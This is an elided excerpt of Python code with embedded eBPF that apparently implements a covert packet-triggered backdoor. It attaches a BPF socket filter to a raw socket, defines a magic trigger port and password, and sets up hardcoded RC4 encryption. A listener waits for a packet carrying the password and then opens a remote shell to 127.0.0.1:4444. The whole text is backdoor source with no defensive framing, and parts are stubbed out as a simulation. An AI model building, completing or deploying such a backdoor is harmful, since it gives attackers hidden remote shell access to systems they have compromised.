...
BUF_SIZE = 32768
RC4_KEY = b"justforfun"
TRIGGER_PORT = 53413  # magic trigger port
TRIGGER_PASS = b"socket"
...
crypt_ctx = RC4Cipher(RC4_KEY)
decrypt_ctx = RC4Cipher(RC4_KEY)
...
int udp_filter(struct __sk_buff *skb) {{
    ...
    struct ip_t {{
        u8 ver_ihl; u8 tos; u16 tlen; u16 identification; u16 flags_fo;
        u8 ttl; u8 proto; u16 crc; u32 src_ip; u32 dst_ip;
    }};
    struct udp_t {{ u16 sport; u16 dport; u16 len; u16 crc; }};
...
fn = b.load_func("udp_filter", BPF.SOCKET_FILTER)
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
sock.setsockopt(socket.SOL_SOCKET, socket.SO_ATTACH_BPF, fn.fd)
...
def listen_for_trigger():
    while True:
        pkt = sock.recv(2048)
        # naive filter simulation (in real case use perf map output)
        if TRIGGER_PASS in pkt:
            remote_shell("127.0.0.1", 4444)
            break
